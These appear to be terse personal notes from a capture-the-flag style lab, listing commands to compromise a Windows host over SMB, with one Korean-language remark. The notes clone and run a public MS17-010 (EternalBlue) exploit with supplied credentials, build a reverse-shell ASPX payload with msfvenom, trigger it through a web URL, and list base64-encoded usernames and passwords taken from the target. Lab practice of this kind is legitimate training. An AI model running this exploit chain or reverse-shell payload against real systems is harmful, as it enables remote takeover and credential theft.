git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python zzz_exploit.py -target-ip 10.10.83.113 -port 445 'Bob:!P@$$W0!@#!@#!@'
curl http://10.10.83.113:49663/nt4wrksv/relevant.aspx

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.83.113 LPORT=443 -f aspx > relevant.aspx

smbclient \\\\10.10.83.113\\nt4wrksv
smbclient port -> 139  일단 추리상 80이랑 139는 제외 인 듯 
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
